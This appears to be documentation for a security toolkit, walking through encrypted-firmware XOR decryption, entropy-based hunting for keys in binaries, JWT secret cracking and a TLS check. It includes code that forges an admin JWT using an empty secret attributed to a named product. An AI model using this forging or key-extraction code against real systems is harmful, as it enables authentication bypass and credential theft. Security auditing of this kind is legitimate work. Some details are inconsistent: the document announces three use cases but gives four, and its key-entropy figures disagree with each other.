# Crypto Analysis Workflow

Three use cases: encrypted firmware extraction, key material detection in binaries, and
cryptographic posture auditing of live or post-compromise systems.

---

## Use case 1: Encrypted firmware extraction

Vendor firmware images are sometimes XOR-encrypted before the root filesystem. The typical
structure is:

```
[encrypted blob: H ~= 7.9]
[decrypted: SquashFS/ext4/ELF -- H ~= 4.5-6.0]
```

### Step 1: Map entropy regions

```python
from ablation.analyzers.entropy_mapper import EntropyMapper

result = EntropyMapper.classify_file('/path/to/firmware.raw')
print(result.summary())

# Find the transition from encrypted to plaintext
transitions = result.find_transitions(threshold=0.5)
for t in transitions:
    print(f"0x{t.offset:x}: {t.from_class} -> {t.to_class}  delta={t.delta:.2f}")
```

A high-to-low entropy transition (`ENCRYPTED -> CODE/DATA`) marks where the plaintext layer
starts.

### Step 2: Recover the XOR key

```python
from ablation.analyzers.xor_solver import XorSolver

solver = XorSolver('/path/to/firmware.raw')

# Full auto -- tries magic KPA first, then Hamming, then frequency analysis
result = solver.solve()

if result.key:
    print(f"Key ({len(result.key)} bytes): {result.key.hex()}")
    print(f"Method: {result.method}")
    print(f"Confidence: {result.confidence:.2f}")

    raw = open('/path/to/firmware.raw', 'rb').read()
    decrypted = result.decrypt(raw)
    open('/tmp/firmware_decrypted.raw', 'wb').write(decrypted)
```

### Step 3: Verify decryption

```python
result2 = EntropyMapper.classify_file('/tmp/firmware_decrypted.raw')
print(result2.summary())
# First region should now be CODE/DATA or show a known filesystem header
```

If the first four bytes of the decrypted output match a known magic (`\x7fELF`, `hsqs`,
etc.), the key is confirmed.

---

## Use case 2: Key material in binaries

Enterprise binaries often contain hardcoded API keys, JWT secrets, TLS private keys, or AES
keys embedded in `.data` or `.rodata`.

### Entropy-guided search

Crypto key material (AES-128/256, RSA private key, EC private key) has high entropy
(H ~= 7.5 to 8.0) but short length (16 to 256 bytes). It appears as a small high-entropy
island surrounded by lower-entropy strings or code.

```python
from ablation.analyzers.entropy_mapper import EntropyMapper

mapper = EntropyMapper('/path/to/binary.so', window_size=32)
regions = mapper.classify()

key_candidates = [r for r in regions if r.cls == 'ENCRYPTED' and r.size <= 256]
for r in key_candidates:
    print(f"  0x{r.offset:x}  size={r.size}  H={r.entropy:.2f}")
    data = open('/path/to/binary.so', 'rb').read()
    print(f"  bytes: {data[r.offset:r.offset+32].hex()}")
```

### CryptoAudit binary scan

```python
from ablation.analyzers.crypto_audit import CryptoAudit

auditor = CryptoAudit()
findings = auditor.scan_binary_keys('/path/to/binary.so')

for f in findings:
    print(f"  0x{f.va:x}: {f.key_type}  ({len(f.key_bytes)} bytes)")
    # key_type: 'AES-128', 'AES-256', 'RSA-PRIVATE', 'EC-PRIVATE', 'HMAC-SECRET'
```

---

## Use case 3: JWT cracking

Enterprise services frequently use weak JWT secrets. This pattern appears in container
orchestration platforms (confirmed: MacStadium Orka, empty-string secret), API gateways with
default configurations, and services that derive secrets from hostname or build timestamp.

```python
from ablation.analyzers.crypto_audit import CryptoAudit

auditor = CryptoAudit()

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.xxx"
result = auditor.crack_jwt(token)

if result.cracked:
    print(f"Secret: '{result.secret}'")
    print(f"Algorithm: {result.algorithm}")
    print(f"Claims: {result.claims}")
    print(f"Expires: {result.expiry}")

# Scan files for embedded JWTs, then crack them
findings = auditor.scan_jwt_files('/path/to/app/')
for f in findings:
    print(f"  {f.file}: {f.token[:40]}...")
    if f.cracked:
        print(f"    SECRET: '{f.secret}'")
```

### Forge a JWT once the secret is known

```python
import jwt  # PyJWT

secret = ""   # confirmed Orka secret
forged = jwt.encode(
    {"sub": "admin@example.com", "role": "admin"},
    secret,
    algorithm="HS256"
)
print(f"Forged token: {forged}")
```

---

## Use case 4: TLS posture assessment

```python
from ablation.analyzers.crypto_audit import CryptoAudit

auditor = CryptoAudit()
result = auditor.check_tls('internal-api.example.com', port=443)
print(result.summary())
```

Output:

```
TLS: internal-api.example.com:443
  Protocol:    TLSv1.2  [WEAK -- recommend TLS 1.3]
  Cipher:      ECDHE-RSA-AES128-GCM-SHA256  [OK]
  Cert expiry: 2027-03-15  [OK]
  Curves:      P-256  [OK]
  HSTS:        NOT SET  [WEAK]
```

---

## Entropy thresholds reference

| Entropy (H) | Class | Typical content |
|---|---|---|
| 7.2 - 8.0 | ENCRYPTED | AES ciphertext, XOR keystream, LZMA, squashfs |
| 6.0 - 7.2 | CODE/DATA | Compressed code, crypto keys, packed binaries |
| 4.5 - 6.0 | CODE/DATA | x86-64/ARM64 .text, instruction and data mix |
| 1.5 - 4.5 | SPARSE | ASCII strings, null-heavy headers, config data |
| 0.0 - 1.5 | PADDING | Null fill, zero-padding, .bss sections |
